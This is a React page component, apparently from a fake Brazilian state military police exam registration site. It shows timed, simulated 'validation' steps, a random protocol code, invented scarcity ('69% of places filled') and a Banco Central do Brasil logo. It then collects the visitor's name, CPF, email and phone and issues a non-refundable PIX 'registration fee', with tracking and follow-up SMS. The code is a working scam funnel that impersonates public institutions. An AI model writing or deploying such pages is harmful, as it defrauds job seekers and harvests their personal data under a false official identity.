import { useState, useEffect, useMemo } from "react";
import logoBancoCentral from "@assets/banco-central-do-brasil-logo-4-removebg-preview_1782870144810.png";
import { useLocation } from "wouter";
import { ExercitoHeader } from "@/components/ExercitoHeader";
import { ExercitoFooter } from "@/components/ExercitoFooter";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import {
  CheckCircle,
  Shield,
  FileCheck,
  CreditCard,
  Loader2,
} from "lucide-react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { useClarityEvents } from "@/hooks/use-clarity-events";
import { getSiteConfig } from "@/lib/siteConfig";
import { useEstadoPM } from "@/hooks/useEstadoPM";

export default function ValidacaoPage() {
  const [, setLocation] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const [applicationData, setApplicationData] = useState<any>(null);
  const [validationAccepted, setValidationAccepted] = useState(false);
  const [paymentAccepted, setPaymentAccepted] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [commitmentAccepted, setCommitmentAccepted] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [currentStep, setCurrentStep] = useState(0);
  const [currentMessage, setCurrentMessage] = useState("");
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [pixAmount, setPixAmount] = useState<number>(82.40);
  const { trackEvent, trackFormFieldCompleted } = useClarityEvents();

  useEffect(() => {
    window.scrollTo(0, 0);

    // Load application data from localStorage
    const savedData = localStorage.getItem("applicationData");
    if (savedData) {
      try {
        const parsedData = JSON.parse(savedData);
        setApplicationData(parsedData);

        // Fetch PIX amount during the loading screen (fire-and-forget, non-blocking)
        const savedAmount = localStorage.getItem('validacaoPixAmount');
        if (savedAmount) {
          setPixAmount(parseFloat(savedAmount));
        } else {
          const userData = JSON.parse(localStorage.getItem('userData') || '{}');
          const pessoalData = JSON.parse(localStorage.getItem('pessoalData') || '{}');
          const genero = userData.gender || userData.genero || userData.sexo ||
                         userData.autoFilledData?.sexo || pessoalData?.sexo || '';
          fetch(`/api/valor-dinamico?tipo=pf&genero=${encodeURIComponent(genero)}`)
            .then((r) => r.json())
            .then((data) => {
              const valor = data.success && data.valor ? data.valor : 82.40;
              localStorage.setItem('validacaoPixAmount', valor.toString());
              setPixAmount(valor);
            })
            .catch(() => {
              localStorage.setItem('validacaoPixAmount', '82.40');
              setPixAmount(82.40);
            });
        }

        // Start validation process with engaging steps
        const validationSteps = [
          "Analisando histórico e documentos...",
          "Verificando compatibilidade com o perfil do cargo...",
          "Consultando base de dados do concurso...",
          `Validando elegibilidade para o Concurso Público ${sigla} 2026...`,
          "Gerando protocolo oficial de seleção...",
        ];

        let stepIndex = 0;
        setCurrentMessage(validationSteps[0]);

        const interval = setInterval(() => {
          stepIndex++;
          if (stepIndex < validationSteps.length) {
            setCurrentStep(stepIndex);
            setCurrentMessage(validationSteps[stepIndex]);
          } else {
            clearInterval(interval);
            setTimeout(() => {
              setIsLoading(false);
            }, 1500);
          }
        }, 2000);

        return () => clearInterval(interval);
      } catch (error) {
        console.error("Error loading application data:", error);
        setLocation("/juramento");
        return;
      }
    } else {
      setLocation("/juramento");
      return;
    }
  }, [setLocation]);

  const getJuntaDisplayName = () => {
    if (applicationData?.selectedJunta?.name) {
      return applicationData.selectedJunta.name;
    }

    // Fallback para cidade se não tiver junta específica
    const cidade =
      applicationData?.juntasData?.municipio ||
      applicationData?.juntasData?.cidade;
    return cidade ? `${cidade}` : "sua cidade";
  };

  const getCityName = () => {
    const municipio =
      applicationData?.juntasData?.municipio ||
      applicationData?.juntasData?.cidade;
    if (municipio) return municipio;

    const locationName = applicationData?.examLocationName;
    if (locationName) {
      const parts = locationName.split(" de ");
      if (parts.length > 1) return parts[parts.length - 1];
    }

    return "sua cidade";
  };

  const validationCode = useMemo(
    () => `${sigla.replace(/[^A-Z0-9]/g, '')}-${Math.floor(Math.random() * 900000) + 100000}`,
    [sigla]
  );

  const handleProceedToPayment = async () => {
    if (
      !validationAccepted ||
      !paymentAccepted ||
      !termsAccepted ||
      !commitmentAccepted
    ) {
      alert("Por favor, aceite todos os termos para continuar.");
      return;
    }

    // Track successful validation acceptance
    trackEvent("validation_terms_accepted", {
      validation_accepted: validationAccepted,
      payment_accepted: paymentAccepted,
      terms_accepted: termsAccepted,
      page: "validacao_page",
      timestamp: new Date().toISOString(),
    });

    setIsProcessingPayment(true);
    setProcessingStep(0);

    const processingSteps = [
      "Conectando ao ambiente seguro...",
      "Verificando dados de inscrição...",
      "Gerando transação PIX...",
      "Finalizando protocolo...",
    ];

    try {
      // Simulate processing steps
      for (let i = 0; i < processingSteps.length; i++) {
        setProcessingStep(i);
        await new Promise((resolve) => setTimeout(resolve, 1500));
      }

      // Generate PIX transaction with complete data
      const userData = JSON.parse(localStorage.getItem("userData") || "{}");
      const pessoalData = JSON.parse(
        localStorage.getItem("pessoalData") || "{}",
      );
      const comeFromRef = localStorage.getItem("come_from_ref");

      // Get complete application data
      const completeApplicationData = {
        ...applicationData,
        userData: userData,
        pessoalData: pessoalData,
        comeFromRef: comeFromRef,
        processedAt: new Date().toISOString(),
      };
      const addres = (userData.cidade || '') + ' - ' + (userData.uf || '');

      // Use the locked amount saved at page load
      const amount = pixAmount;
      const valor = Math.round(amount * 100);

      const pixResponse = await fetch("/api/gerar-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: amount,
          description: `${import.meta.env.VITE_PRODUCT_NAME || 'PM'}1`,
          customer: {
            name: userData.nomeCompleto,
            email: userData.email,
            cpf: userData.cpf,
            phone: userData.telefone,
          },
          utm_params: (() => {
            const safeObj = (raw: string | null): Record<string, unknown> => {
              try {
                const parsed = JSON.parse(raw || '{}');
                return (parsed !== null && typeof parsed === 'object' && !Array.isArray(parsed))
                  ? parsed as Record<string, unknown>
                  : {};
              } catch { return {}; }
            };
            const base = safeObj(localStorage.getItem('utm_params'));
            const ud   = safeObj(localStorage.getItem('userData'));
            const pd   = safeObj(localStorage.getItem('pessoalData'));
            const udAuto = (ud.autoFilledData instanceof Object && !Array.isArray(ud.autoFilledData))
              ? ud.autoFilledData as Record<string, unknown>
              : {};
            const SITE = getSiteConfig();
            const str = (v: unknown): string => (typeof v === 'string' ? v : '');
            return {
              ...base,
              rt_gender: str(ud.gender) || str(ud.genero) || str(ud.sexo) || str(udAuto.sexo) || str(pd.sexo),
              rt_birthday: str(ud.dataNascimento) || str(ud.birthday) || str(pd.dataNascimento),
              rt_phone: str(ud.telefone),
              rt_zipcode: str(ud.cep),
              red_url: SITE.redUrl ?? '',
              cargo_nome: applicationData?.positionTitle || undefined,
            };
          })(),
          nome: userData.nomeCompleto,
          cpf: userData.cpf,
          email: userData.email,
          telefone: userData.telefone,
          valor: valor,
          applicationData: completeApplicationData,
          inscricaoData: {
            vaga: {
              id: applicationData.positionId || 'unknown',
              title: `Concurso Público ${sigla} 2026 — ` + addres,
              company: sigla,
              location: addres,
              area: 'Segurança Pública',
              carga_horaria: 'Dedicação Exclusiva',
              requirements: 'Conforme edital',
              meta: pessoalData,
            },
            localProva: applicationData.selectedJunta ? {
              name: applicationData.selectedJunta.name,
              address: applicationData.selectedJunta.address,
              type: applicationData.selectedJunta.type,
              distance: applicationData.selectedJunta.distance?.toString(),
              place_id: applicationData.selectedJunta.place_id,
            } : {
              name: applicationData.examLocationName || 'Local a definir',
              address: 'Endereço será informado por e-mail',
              type: 'batalhao_policia_militar',
              distance: '0',
            },
            dataProva: applicationData.examDate || '2026-08-15',
            horaProva: applicationData.examTime || '14:00',
          },
        }),
      });

      const pixData = await pixResponse.json();

      if (pixData.success) {
        // Save PIX data to localStorage
        localStorage.setItem("pixTransaction", JSON.stringify(pixData.data));

        // SMS de pagamento — fire-and-forget, não bloqueia nem afeta o redirect
        const firstName = (userData.nomeCompleto || '').split(' ')[0];
        if (userData.telefone && firstName) {
          fetch('/api/sms-pagamento', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              phoneNumber: userData.telefone,
              firstName,
              gender: userData.genero || userData.gender || userData.sexo || userData.autoFilledData?.sexo || '',
              city: userData.cidade || '',
            }),
          }).catch(() => { /* silencioso — SMS nunca bloqueia o funil */ });
        }

        // Redirect to payment page
        setLocation("/pagamento-page");
      } else {
        throw new Error("Erro ao gerar transação PIX");
      }
    } catch (error) {
      console.error("Erro ao processar pagamento:", error);
      alert("Erro ao processar pagamento. Tente novamente.");
    } finally {
      setIsProcessingPayment(false);
    }
  };

  // Validation Loading Screen
  if (isLoading) {
    return (
      <div
        className="min-h-screen flex items-center justify-center"
        style={{
          fontFamily: "Rawline, Arial, sans-serif",
          backgroundColor: "#FFFFFF",
        }}
      >
        <div className="text-center max-w-sm mx-auto px-6">
          {/* Simple Spinner */}
          <div
            className="w-12 h-12 mx-auto mb-8 border-4 border-gray-200 rounded-full animate-spin"
            style={{
              borderTopColor: "#1351b4",
            }}
          ></div>

          {/* Current Message */}
          <h2 className="text-lg font-medium mb-4" style={{ color: "#1351b4" }}>
            {currentMessage}
          </h2>

          {/* Simple Progress */}
          <div
            className="w-full h-1 rounded-full mb-4"
            style={{ backgroundColor: "#D9E6F2" }}
          >
            <div
              className="h-1 rounded-full transition-all duration-1000 ease-out"
              style={{
                width: `${((currentStep + 1) / 5) * 100}%`,
                backgroundColor: "#1351b4",
              }}
            />
          </div>

          <p className="text-sm" style={{ color: "#1351b4" }}>
            Preparando documento oficial
          </p>
        </div>
      </div>
    );
  }

  if (!applicationData) {
    return (
      <div
        className="min-h-screen bg-white flex items-center justify-center"
        style={{ fontFamily: "Rawline, Arial, sans-serif" }}
      >
        <div className="text-center">
          <h2 className="text-xl font-semibold text-gray-900 mb-2">
            Carregando...
          </h2>
          <p className="text-gray-600">Redirecionando...</p>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen"
      style={{ fontFamily: "Rawline, Arial, sans-serif" }}
    >
      <ExercitoHeader customTitle={sigla} customSubtitle="Validação de Identidade" />

      <main className="max-w-4xl mx-auto px-6 py-8 pt-0">
        <div className="text-center mb-6">
          <h1 className="text-2xl font-bold text-gray-900 mb-2">
            Protocolo Oficial de Seleção
          </h1>
          <p className="text-gray-600 text-sm">
            {sigla} — Concurso Público 2026 | Banca: CEBRASPE
          </p>
        </div>

        {/* Protocolo Oficial */}
        <div className="grid md:grid-cols-2 gap-6 mb-8">
          <Card className="border-0 shadow-sm">
            <CardContent className="p-6">
              <div className="text-center mb-4">
                <div className="w-12 h-12 bg-yellow-400 rounded-full flex items-center justify-center mx-auto mb-3">
                  <CheckCircle className="w-7 h-7 text-white" />
                </div>
                <h2 className="font-bold text-gray-900">Protocolo em Andamento</h2>
                <p className="text-sm text-gray-600">
                  Documento pendente
                </p>
              </div>

              <div className="space-y-3 text-sm">
                <div className="flex justify-between py-2 border-b border-gray-100">
                  <span className="text-gray-600">Status:</span>
                  <span className="font-semibold text-yellow-500">PENDENTE</span>
                </div>
                <div className="flex justify-between py-2 border-b border-gray-100">
                  <span className="text-gray-600">Modalidade:</span>
                  <span className="font-medium">Compatível</span>
                </div>
                <div className="flex justify-between py-2 border-b border-gray-100">
                  <span className="text-gray-600">Unidade:</span>
                  <span className="font-medium">{getJuntaDisplayName()}</span>
                </div>
                <div className="flex justify-between py-2">
                  <span className="text-gray-600">Código:</span>
                  <span className="font-mono text-gray-800">
                    #{validationCode}
                  </span>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm">
            <CardContent className="p-6">
              <div className="mb-4">
                <h3 className="font-bold text-gray-900 mb-2">
                  Protocolo Oficial de Seleção
                </h3>
                <p className="text-sm text-gray-700 mb-4">
                  Este documento será exigido no dia da prova e comprova que sua
                  inscrição está validada junto ao comando da {sigla} local.
                </p>
              </div>

              <div className="bg-gray-50 rounded p-4">
                <h4 className="font-semibold text-gray-900 mb-2 text-sm">
                  Documento Obrigatório
                </h4>
                <p className="text-xs text-gray-600 mb-3">
                  O Protocolo Oficial de Seleção é reconhecido formalmente pela
                  {" "}{sigla} de {getCityName()} e deve ser apresentado no
                  local da prova.
                </p>
                <p className="text-xs text-gray-600">
                  Documento protegido contra fraudes — comprova sua participação
                  oficial no Concurso Público {sigla} 2026.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Seção de Aceites */}
        <Card className="border-0 shadow-sm">
          <CardContent className="p-6">
            <div className="mb-6">
              <h2 className="font-bold text-gray-900 mb-2">
                Emissão do Protocolo Oficial de Seleção
              </h2>
              <p className="text-sm text-gray-600">
                Confirme os termos para gerar seu documento obrigatório para o
                dia da prova
              </p>
            </div>

            <div className="space-y-4">
              {/* Checkbox 1 - Validação */}
              <div className="border border-gray-200 rounded-lg p-4">
                <div className="flex items-start space-x-3">
                  <Checkbox
                    id="validation"
                    checked={validationAccepted}
                    onCheckedChange={(checked) => {
                      setValidationAccepted(checked as boolean);
                      trackEvent("validation_checkbox_clicked", {
                        checkbox_type: "validation_terms",
                        checked: checked as boolean,
                        page: "validacao_page",
                        timestamp: new Date().toISOString(),
                      });
                    }}
                    className="mt-1"
                  />
                  <label
                    htmlFor="validation"
                    className="text-sm text-gray-700 cursor-pointer leading-relaxed"
                  >
                    Declaro que estou ciente de que preciso do Protocolo Oficial
                    de Seleção para comparecer à prova e que aceito as condições
                    do Concurso Público {sigla} 2026.
                  </label>
                </div>
              </div>

              {/* Bloco Para Garantir Sua Vaga + Checkbox 1 */}
              {validationAccepted && (
                <div className="space-y-4">
                  {/* Taxa de Inscrição */}
                  <div className="border-l-4 border-amber-500 bg-amber-50 p-6">
                    <h4 className="text-lg font-semibold text-amber-900 mb-4">
                      Taxa de Inscrição
                    </h4>
                    <p className="text-gray-800 mb-4 text-sm leading-relaxed">
                      Conforme previsto no edital do Concurso Público {sigla} 2026, é
                      necessário o pagamento da{" "}
                      <strong>
                        Taxa de Inscrição
                      </strong>{" "}
                      no valor de <strong>R$ {pixAmount.toFixed(2).replace('.', ',')}</strong> para confirmação da
                      participação no processo seletivo.
                    </p>
                    <div className="border-l-2 border-gray-300 pl-4 mb-4">
                      <p className="text-gray-700 text-sm font-medium mb-1">
                        Taxa obrigatória e de valor único
                      </p>
                      <p className="text-gray-600 text-sm leading-relaxed">
                        O valor é destinado a custear o processo seletivo (aplicação
                        da prova, correção e organização logística) e{" "}
                        <strong>não é reembolsável</strong>, exceto nos casos de{" "}
                        <strong>isenção de taxa deferida</strong> conforme critérios
                        do edital ou <strong>cancelamento oficial do concurso</strong>{" "}
                        pela organização.
                      </p>
                    </div>
                    <p className="text-gray-700 mb-4 text-sm leading-relaxed">
                      O pagamento dentro do prazo é condição obrigatória para a
                      efetivação da inscrição e a emissão do Protocolo Oficial de
                      Seleção.
                    </p>
                  </div>

                  {/* Checkbox 1 */}
                  <div className="bg-gray-50 border border-gray-200 rounded p-4">
                    <label className="flex items-start space-x-3 cursor-pointer text-sm">
                      <Checkbox
                        id="payment"
                        checked={paymentAccepted}
                        onCheckedChange={(checked) => {
                          setPaymentAccepted(checked as boolean);
                          trackEvent("payment_checkbox_clicked", {
                            checkbox_type: "payment_terms",
                            checked: checked as boolean,
                            amount: pixAmount,
                            page: "validacao_page",
                            timestamp: new Date().toISOString(),
                          });
                        }}
                        className="mt-0.5"
                      />
                      <span className="text-gray-700 leading-relaxed">
                        Estou ciente dos requisitos estabelecidos para
                        participação no processo seletivo público
                      </span>
                    </label>
                  </div>
                </div>
              )}

              {/* Step 1: Benefícios e Garantias */}
              {validationAccepted && paymentAccepted && (
                <div className="space-y-4">
                  {/* Benefícios incluídos */}
                  <div className="border-l-4 border-[#1351b4] bg-white p-6">
                    <h5 className="font-medium text-gray-800 mb-4">
                      Benefícios incluídos no pagamento da taxa
                    </h5>
                    <div className="space-y-3 text-sm text-gray-700">
                      {[
                        "Vaga garantida no local e horário escolhidos",
                        "Acesso ao portal exclusivo do candidato",
                        "Material orientativo digital",
                        "Suporte técnico especializado",
                      ].map((item) => (
                        <div key={item} className="flex items-start">
                          <span className="w-2 h-2 bg-[#1351b4] rounded-full mt-2 mr-3 flex-shrink-0"></span>
                          <span>{item}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Política de reembolso */}
                  <div className="bg-gray-50 border border-gray-200 rounded p-6">
                    <h5 className="font-medium text-gray-800 mb-4">
                      Política de reembolso da taxa
                    </h5>
                    <div className="space-y-4 text-sm">
                      <div>
                        <p className="font-medium text-gray-800">
                          Regra geral: taxa não reembolsável
                        </p>
                        <p className="text-gray-600">
                          Assim como em outros concursos públicos, a taxa de
                          inscrição não é devolvida após o pagamento
                        </p>
                      </div>
                      <div>
                        <p className="font-medium text-gray-800">
                          Isenção de taxa deferida
                        </p>
                        <p className="text-gray-600">
                          Candidatos com isenção deferida conforme os critérios
                          do edital têm o valor integralmente reembolsado
                        </p>
                      </div>
                      <div>
                        <p className="font-medium text-gray-800">
                          Cancelamento oficial do concurso
                        </p>
                        <p className="text-gray-600">
                          Reembolso integral caso o processo seletivo seja
                          cancelado oficialmente pela organização
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Checkbox 2 */}
                  <div className="bg-gray-50 border border-gray-200 rounded p-4">
                    <label className="flex items-start space-x-3 cursor-pointer text-sm">
                      <Checkbox
                        id="terms"
                        checked={termsAccepted}
                        onCheckedChange={(checked) => {
                          setTermsAccepted(checked as boolean);
                          trackEvent("final_terms_checkbox_clicked", {
                            checkbox_type: "final_terms",
                            checked: checked as boolean,
                            page: "validacao_page",
                            timestamp: new Date().toISOString(),
                          });
                        }}
                        className="mt-0.5"
                      />
                      <span className="text-gray-700 leading-relaxed">
                        Aceito os termos e condições para participação no
                        processo seletivo
                      </span>
                    </label>
                  </div>
                </div>
              )}

              {/* Step 2: Informações importantes + Dados + Checkbox 3 */}
              {validationAccepted && paymentAccepted && termsAccepted && (
                <div className="space-y-4">
                  {/* Informações importantes */}
                  <div className="bg-blue-50 border border-blue-200 rounded p-6">
                    <h5 className="font-medium text-gray-800 mb-4">
                      Informações importantes
                    </h5>
                    <div className="space-y-3 text-sm text-gray-700">
                      <p>
                        O pagamento da taxa de inscrição confirma sua
                        participação no processo seletivo, conforme previsto
                        no edital do Concurso Público {sigla} 2026.
                      </p>
                      <p>
                        Candidatos com isenção de taxa deferida não precisam
                        efetuar o pagamento.
                      </p>
                      <p>
                        O pagamento garante sua participação no processo
                        seletivo e acesso aos recursos de apoio ao candidato.
                      </p>
                      <p>
                        Em caso de cancelamento oficial do processo, o valor é
                        integralmente reembolsado.
                      </p>
                    </div>
                  </div>

                  {/* Dados do programa */}
                  <div className="border border-orange-200 bg-orange-50 rounded p-4">
                    <div className="flex items-start gap-2">
                      <span className="text-orange-500 font-bold mt-0.5">⚠</span>
                      <p className="text-sm font-medium text-orange-800">
                        <strong>69% das vagas deste edital já foram preenchidas.</strong> Confirme sua inscrição antes que as vagas se esgotem.
                      </p>
                    </div>
                  </div>

                  {/* Checkbox 3 */}
                  <div className="bg-gray-50 border border-gray-200 rounded p-4">
                    <label className="flex items-start space-x-3 cursor-pointer text-sm">
                      <Checkbox
                        id="commitment"
                        checked={commitmentAccepted}
                        onCheckedChange={(checked) => {
                          setCommitmentAccepted(checked as boolean);
                          trackEvent("commitment_checkbox_clicked", {
                            checkbox_type: "commitment",
                            checked: checked as boolean,
                            page: "validacao_page",
                            timestamp: new Date().toISOString(),
                          });
                        }}
                        className="mt-0.5"
                      />
                      <span className="text-gray-700 leading-relaxed">
                        Confirmo minha participação no processo seletivo e
                        finalização da inscrição
                      </span>
                    </label>
                  </div>
                </div>
              )}

              {/* Finalização da Inscrição + Esclarecimentos */}
              {validationAccepted &&
                paymentAccepted &&
                termsAccepted &&
                commitmentAccepted && (
                  <div className="space-y-4">
                    <div className="border border-gray-200 rounded p-6">
                      <h5 className="font-medium text-gray-800 mb-6 text-center">
                        Finalização da Inscrição
                      </h5>
                      <p className="text-sm text-gray-600 mb-6">
                        Para concluir sua inscrição, é necessário gerar o
                        Protocolo Oficial de Seleção e efetuar o pagamento da
                        taxa de inscrição via Pix.
                      </p>
                      <div className="text-center">
                        <Button
                          onClick={handleProceedToPayment}
                          className="w-full text-white font-medium py-3"
                          style={{ backgroundColor: "#1351b4" }}
                        >
                          Gerar Protocolo Oficial de Seleção
                        </Button>
                        <p className="text-xs text-gray-500 mt-3">
                          Processamento seguro • Confirmação por e-mail
                        </p>
                      </div>
                    </div>

                    <div className="border border-gray-200 rounded p-4">
                      <h6 className="font-medium text-gray-800 mb-3">
                        Esclarecimentos
                      </h6>
                      <div className="space-y-3 text-xs text-gray-600">
                        <div>
                          <span className="font-medium text-gray-700">
                            Reembolso:
                          </span>{" "}
                          Apenas em caso de isenção de taxa deferida ou
                          cancelamento oficial do concurso
                        </div>
                        <div>
                          <span className="font-medium text-gray-700">
                            Validade:
                          </span>{" "}
                          Protocolo válido por 30 dias a partir da emissão
                        </div>
                        <div>
                          <span className="font-medium text-gray-700">
                            Suporte:
                          </span>{" "}
                          Atendimento disponível via canais oficiais
                        </div>
                      </div>
                    </div>
                  </div>
                )}
            </div>
          </CardContent>
        </Card>
      </main>

      <ExercitoFooter />

      {/* Payment Processing Modal */}
      <Dialog open={isProcessingPayment} onOpenChange={() => {}}>
        <DialogContent className="sm:max-w-sm border-0 shadow-lg">
          <div className="text-center py-6">
            <img
              src={logoBancoCentral}
              alt="Banco Central do Brasil"
              className="h-10 mx-auto mb-4 object-contain"
            />

            <Loader2 className="w-6 h-6 animate-spin mx-auto mb-3 text-[#1351b4]" />

            <h3 className="text-sm font-medium text-gray-900 mb-1">
              Ambiente Seguro
            </h3>

            <p className="text-xs text-gray-600 mb-4">
              {processingStep < 4
                ? [
                    "Conectando...",
                    "Verificando...",
                    "Gerando guia de pagamento...",
                    "Criando pagamento seguro juntamente com o Banco Central...",
                  ][processingStep]
                : "Concluído"}
            </p>

            <div className="flex justify-center space-x-1 mb-3">
              {[0, 1, 2, 3].map((step) => (
                <div
                  key={step}
                  className={`w-1.5 h-1.5 rounded-full transition-colors duration-300 ${
                    step <= processingStep ? "bg-[#1351b4]" : "bg-gray-300"
                  }`}
                />
              ))}
            </div>

            <div className="text-xs text-gray-500 flex items-center justify-center">
              <Shield className="w-3 h-3 mr-1" />
              Seguro
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
